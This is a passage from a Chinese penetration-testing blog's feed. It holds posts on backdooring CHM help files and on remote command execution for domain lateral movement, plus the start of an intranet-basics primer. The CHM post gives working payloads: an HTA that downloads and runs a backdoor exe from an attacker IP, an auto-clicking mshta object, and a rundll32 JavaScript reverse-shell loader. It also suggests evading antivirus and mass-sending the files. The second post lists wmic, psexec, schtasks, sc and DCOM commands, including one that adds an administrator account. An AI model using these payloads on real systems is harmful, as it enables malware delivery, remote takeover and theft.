&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line"># mv &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;downloader.sct &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line"># netstat -tulnp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># cat loader.hta可以清晰的看到,此hta中放的才是真正的ps下载者</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">window.resizeTo 0,0</span><br><span class="line">window.MoveTo -100,-100</span><br><span class="line">const impersonation &#x3D; 3</span><br><span class="line">Const HIDDEN_WINDOW &#x3D; 12</span><br><span class="line">Set Locator &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">Locator.Run&quot;PowerShell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.3.14&#x2F;chmbackdoor.exe&#39;,&#39;c:\\windows\\temp\\chmbackdoor.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\windows\\temp\\chmbackdoor.exe&#39;);&quot;,0,FALSE</span><br><span class="line">window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt;</span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure><p>而在chm文件中则是执行上面hta,但执行hta本身却是没有黑框的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,mshta,http:&#x2F;&#x2F;192.168.3.14&#x2F;loader.hta&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>当目标正常双击打开我们发给他的chm文件时,稍等片刻[ps下载稍微需要点儿时间],另外,因为是下载自己的马,所以免杀和马的体积[越小越好]要务必处理好<br><img src="/posts/13577/11.png" alt></p><h2 id="0x04-利用js来无痕触发chm后门"><a href="#0x04-利用js来无痕触发chm后门" class="headerlink" title="0x04 利用js来无痕触发chm后门"></a>0x04 利用js来无痕触发chm后门</h2><p><strong>第一种方式</strong><br>直接powershell脚本来免杀弹回一个半交互的shell，这种方式通常比较适合针对单个单点拿shell,可能需要人一直守着,一旦看到上了以后,就需要里面进行下一步的动作,脚本的具体使用,如下,先修改监听ip,为本机ip[实战中肯定是用vps的公网ip来搞]</p><p><a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" target="_blank" rel="noopener" title="JSRat.ps1">https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Server &#x3D; &#39;192.168.72.23&#39; #Listening IP. Change This.</span><br></pre></td></tr></table></figure><p>而后加载执行脚本开始监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File JSRat.ps1</span><br></pre></td></tr></table></figure><p><img src="/posts/13577/9.png" alt><br>接下来的事情就是把下面的利用代码替换到我们事先准备好的chm中,具体如下,记得里面的ip要改成上面监听的ip,另外,务必要注意value=中的单双引号问题,否则语法错误会造成payload无法被正常执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);w&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;);try&#123;v&#x3D;w.RegRead(&quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer&quot;);q&#x3D;v.split(&quot;&#x3D;&quot;)[1].split(&quot;;&quot;)[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.11&#x2F;connect&quot;,false);try&#123;h.Send();B&#x3D;h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure><p>之后,再重新编译chm,丢到目标机器上打开,即可看到一个cmd shell被正常弹回,只不过,这里稍微有点瑕疵,当第一次打开chm的一瞬间,会有所卡顿[其实这个过程就是在执行payload,也可能是rudll32的问题,regsvr32就不会],而之后再打开,就没有多大感觉了</p><p>Shell回来以后,为了巩固权限,可立即远程加载执行自己的马,毕竟,一个cmd shell肯定活不了多长时间<br><img src="/posts/13577/10.png" alt></p><p><strong>第二种方式</strong></p><p>原理一样,只不过这次是用python脚本,主要针对想自动批量上线的需求[适合群发]<br><a href="https://github.com/Ridter/MyJSRat" target="_blank" rel="noopener" title="MyJSRat.py">https://github.com/Ridter/MyJSRat</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MyJSRat.py -i 192.168.1.101 -p 3333</span><br></pre></td></tr></table></figure><p>访问 <a href="http://192.168.72.23:3333/wtf" target="_blank" rel="noopener">http://192.168.72.23:3333/wtf</a> 获取攻击代码如下：<br><img src="/posts/13577/5.png" alt></p><p>将攻击代码写入html文件<br><img src="/posts/13577/6.png" alt></p><p>编译以后运行，可以成功获取JS交互shell<br><img src="/posts/13577/8.png" alt></p><h2 id="0x05-针对chm的后门的有效防御"><a href="#0x05-针对chm的后门的有效防御" class="headerlink" title="0x05 针对chm的后门的有效防御"></a>0x05 针对chm的后门的有效防御</h2><ol><li>利用windows自带的hh命令,便可以轻松反编译chm源文件,通过看源文件中的代码很容易就能发现此类后门<br>具体命令格式如下: # hh -decompile C:\Users\scan\Desktop\new C:\Users\scan\Desktop\works\source.chm</li><li>严禁随意打开别人发过来的各种chm文件,很多人就是通过这种方式,把程序员经常用到的一些开发手册[通常都是chm文件]加工成后门后往各个站点里发,以此发来大批量挂马收集肉鸡</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-chm-是什么&quot;&gt;&lt;a href=&quot;#0x00-chm-是什么&quot; class=&quot;headerlink&quot; title=&quot;0x00 chm 是什么&quot;&gt;&lt;/a&gt;0x00 chm 是什么&lt;/h2&gt;&lt;p&gt;CHM [Compiled Help Manual],即”已
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域渗透远程执行命令的几种姿势</title>
    <link href="http://mysecroad.github.io/posts/35747.html"/>
    <id>http://mysecroad.github.io/posts/35747.html</id>
    <published>2019-10-16T12:08:41.000Z</published>
    <updated>2020-04-26T13:21:49.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="域渗透远程执行命令的几种姿势"><a href="#域渗透远程执行命令的几种姿势" class="headerlink" title="域渗透远程执行命令的几种姿势"></a>域渗透远程执行命令的几种姿势</h1><h2 id="0x00-vmic"><a href="#0x00-vmic" class="headerlink" title="0x00 vmic"></a>0x00 vmic</h2><p>WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统，攻击者使用 wmi 来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到<strong>无日志</strong>，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用 wmic 进行远程执行命令。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li><p>在远程系统上执行 bat 脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.72.10 &#x2F;user:administrator &#x2F;password:L111111! process call create c:\test.bat</span><br></pre></td></tr></table></figure></li><li><p>在远程系统上执行单条命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.72.10 &#x2F;user:administrator &#x2F;password:L111111 process call create &quot;cmd.exe &#x2F;c net user test1 !@#123QWE &#x2F;add &amp;&amp; net localgroup administrators test1 &#x2F;add</span><br></pre></td></tr></table></figure></li></ol><h3 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h3><ol><li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li><li>远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li><li>wmic 会以管理员权限在远程系统上执行命令</li><li>防火墙开启将无法连接</li><li>如果报错 “Invalid Global Switch” ，用双引号把包含-的结点括起来即可正常执行。</li></ol><h2 id="0x01-psexec"><a href="#0x01-psexec" class="headerlink" title="0x01 psexec"></a>0x01 psexec</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>psexec针对远程建立连接的认证方式有两种，一种先建立 ipc 连接，然后直接用 <code>psexec \\192.168.72.10 cmd</code> 命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。</p><p><img src="/posts/35747/11.png" alt></p><p><img src="/posts/35747/12.png" alt></p><h3 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h3><ol><li>通过ipc连接，释放psexesvc.exe到目标</li><li>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</li><li>客户端连接执行命令,服务端启动相应的程序并执行回显数据</li></ol><h3 id="工具说明-1"><a href="#工具说明-1" class="headerlink" title="工具说明"></a>工具说明</h3><p><strong>注意：</strong></p><ol><li>目标主机第一次运行时，会出现弹框提示。<br>解决办法：先执行 <code>psexec /accepteula</code> 即可避免。</li><li>运行完之后记得删除服务。这个在日志中会有记录，而且在少数情况下会出现服务删除不成功！！！<br>所以一般不用它。</li><li>需要远程系统开启 ADMIN$ 共享</li><li>建立 ipc 连接后可以不指定用户名和密码</li></ol><h2 id="0x02-WMIEXEC"><a href="#0x02-WMIEXEC" class="headerlink" title="0x02 WMIEXEC"></a>0x02 WMIEXEC</h2><p>WMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。 当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。<br><img src="/posts/35747/21.png" alt><br>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。</p><p>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p><p><strong>半交互式shell模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell IP username password</span><br></pre></td></tr></table></figure><p><img src="/posts/35747/22.png" alt></p><p><strong>单个命令执行的模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd IP username password &quot;command&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/35747/23.png" alt></p><h2 id="0x03-at-amp-schtasks计划任务"><a href="#0x03-at-amp-schtasks计划任务" class="headerlink" title="0x03 at&amp;schtasks计划任务"></a>0x03 at&amp;schtasks计划任务</h2><h3 id="net-use-at"><a href="#net-use-at" class="headerlink" title="net use + at"></a>net use + at</h3><p>建立ipc连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标IP\ipc$ password &#x2F;user:username</span><br></pre></td></tr></table></figure><p>拷贝文件到远程系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 文件 \\目标IP\c$</span><br></pre></td></tr></table></figure><p>查看远程主机当前时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标IP</span><br></pre></td></tr></table></figure><p>添加计划任务在远程系统上执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\目标IP 时间 cmd.exe &#x2F;c &quot;ipconfig &#x2F;all &gt;c:ip.log&quot;</span><br></pre></td></tr></table></figure><p>添加计划任务在远程系统上执行bat脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\目标IP 时间 c:test.bat</span><br></pre></td></tr></table></figure><p>查看at任务列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\目标IP</span><br></pre></td></tr></table></figure><p>删除at计划任务，运行完成后一定要删除计划任务！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\目标IP 1 &#x2F;delete</span><br></pre></td></tr></table></figure><p>查看所有ipc连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure><p>删除指定ipc连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标IP\ipc$ &#x2F;del</span><br></pre></td></tr></table></figure><p>删除所有ipc连接（删除前记得确认是否都是自己测试中建立的连接）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use * &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure><h3 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h3><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行单条命令)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr &quot;cmd.exe &#x2F;c netstat -ano | findstr 3389 &gt;&gt; c:\programdata\error.log&quot; &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure><p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行 bat 脚本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr c:\programdata\test.bat &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure><p>在远程系统建立计划任务(计划运行时会以管理员权限在远程系统上执行单条命令),注：这条命令不支持 hash 注入后省去用户名密码执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr &quot;cmd.exe &#x2F;c whoami &#x2F;all &gt;&gt; c:\programdata\error.log&quot; &#x2F;ru  workgroup\administrator&quot;</span><br></pre></td></tr></table></figure><p>查看建立的计划任务是否正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; | findstr test</span><br></pre></td></tr></table></figure><p>运行建立的计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;run &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;i &#x2F;tn &quot;test&quot;</span><br></pre></td></tr></table></figure><p>删除建立的计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn &quot;test&quot; &#x2F;f</span><br></pre></td></tr></table></figure><p>注意：<br>工具需要远程系统启动 Task Scheduler 服务，schtasks 不需要 RPC 服务的支持，在条件允许的情况下，尽量使用 schtasks，因为在某些条件下，at 执行完任务后，任务信息没有删除（需要手动删除），用at命令查不到任务信息，但是用 schtasks 却能看到任务信息，任务名是At加一个数字。</p><h2 id="0x04-SC添加服务远程执行命令"><a href="#0x04-SC添加服务远程执行命令" class="headerlink" title="0x04 SC添加服务远程执行命令"></a>0x04 SC添加服务远程执行命令</h2><h3 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传等待运行的 bat 脚本到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行 bat 脚本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.17.138 create test binpath&#x3D; &quot;cmd.exe &#x2F;c start c:\programdata\test.bat&quot;</span><br></pre></td></tr></table></figure><p>开启服务，运行其它命令可以直接修改 bat 脚本内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.17.138 start test</span><br></pre></td></tr></table></figure><p>删除服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.17.138 delete test</span><br></pre></td></tr></table></figure><h2 id="0x05-smbexec"><a href="#0x05-smbexec" class="headerlink" title="0x05 smbexec"></a>0x05 smbexec</h2><p>smbexec 是基于 psexec 修改的程序，加入了参数来指定默认共享，可以在目标为开启 admin$ 共享但开了其它共享时使用。</p><h3 id="常用命令-3"><a href="#常用命令-3" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传 execserver.exe 到远程系统上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy execserver.exe \\192.168.17.138\c$\windows</span><br></pre></td></tr></table></figure><p>在远程系统上执行单条命令(以管理员权限执行命令)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE &quot;whoami &#x2F;all&quot; c$</span><br></pre></td></tr></table></figure><p>在远程系统上执行单条命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe 192.168.17.138 test !@#123QWE &quot;whoami &#x2F;all&quot; c$</span><br></pre></td></tr></table></figure><p>在远程系统上执行 bat 脚本(以管理员权限执行命令)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE c:\programdata\test.bat ipc$</span><br></pre></td></tr></table></figure><p>删除远程系统上的 execserver.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del \\192.168.17.138\c$\windows\execserver.exe</span><br></pre></td></tr></table></figure><h2 id="0x06-利用DCOM在远程系统执行程序"><a href="#0x06-利用DCOM在远程系统执行程序" class="headerlink" title="0x06 利用DCOM在远程系统执行程序"></a>0x06 利用DCOM在远程系统执行程序</h2><h3 id="DCOM使用介绍"><a href="#DCOM使用介绍" class="headerlink" title="DCOM使用介绍"></a>DCOM使用介绍</h3><h4 id="获得DCOM的程序列表"><a href="#获得DCOM的程序列表" class="headerlink" title="获得DCOM的程序列表"></a>获得DCOM的程序列表</h4><p>powershell命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure><p><img src="/posts/35747/1.png" alt></p><p>注意：<br><code>Get-CimInstance</code> 只适用于Powershell 3.0及以上，Win7默认为2.0不支持，可使用以下替代命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure><p>当然，直接使用wmic查询也可以，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET &#x2F;all &#x2F;FORMAT:list</span><br></pre></td></tr></table></figure><p>powershell对WMI的调用可使用wmic命令进行替换，详情可参考：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/</a></p><h4 id="对本机测试"><a href="#对本机测试" class="headerlink" title="对本机测试"></a>对本机测试</h4><p>管理员权限，powershell代码如下:<br>获得”MMC20.Application”支持的操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView | Get-Member</span><br></pre></td></tr></table></figure><p><img src="/posts/35747/2.png" alt></p><p><strong>查看ExecuteShellCommand对应的参数说明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$com.Document.ActiveView.ExecuteShellCommand</span><br></pre></td></tr></table></figure><p><img src="/posts/35747/3.png" alt></p><p>ExecuteShellCommand 对应的参数具体含义可参考以下链接：</p><p><a href="https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx</a></p><p>通过ExecuteShellCommand执行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure><h4 id="对远程系统测试"><a href="#对远程系统测试" class="headerlink" title="对远程系统测试"></a>对远程系统测试</h4><p><strong>调用MMC20.Application</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.72.10&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure><p><img src="/posts/35747/4.png" alt></p><p>win7查看后台程序列表<br><img src="/posts/35747/5.png" alt></p><p><strong>调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.0.2&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$item &#x3D; $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure><p><img src="/posts/35747/6.png" alt></p><p><strong>注意：</strong></p><p>以上两种方式适用于Win7-Win10</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;域渗透远程执行命令的几种姿势&quot;&gt;&lt;a href=&quot;#域渗透远程执行命令的几种姿势&quot; class=&quot;headerlink&quot; title=&quot;域渗透远程执行命令的几种姿势&quot;&gt;&lt;/a&gt;域渗透远程执行命令的几种姿势&lt;/h1&gt;&lt;h2 id=&quot;0x00-vmic&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
    
      <category term="域渗透" scheme="http://mysecroad.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透基础总结</title>
    <link href="http://mysecroad.github.io/posts/44578.html"/>
    <id>http://mysecroad.github.io/posts/44578.html</id>
    <published>2019-09-18T12:19:27.000Z</published>
    <updated>2020-04-26T13:21:40.659Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-内网"><a href="#0x00-内网" class="headerlink" title="0x00 内网"></a>0x00 内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p><h2 id="0x01-工作组、家庭组、域"><a href="#0x01-工作组、家庭组、域" class="headerlink" title="0x01 工作组、家庭组、域"></a>0x01 工作组、家庭组、域</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><ul><li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li><li>通常情况下，计算机的数量不超过二十台。</li><li>工作组不受密码保护。</li><li>所有的计算机必须在同一本地网络或子网中。</li></ul><h3 id="家庭组"><a href="#家庭组" class="headerlink" title="家庭组"></a>家庭组</h3><ul><li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li><li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li></ul><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p><p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p><p>域控制器（ Domain Controller ，简写为 DC ）可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p><p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p><ul><li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust 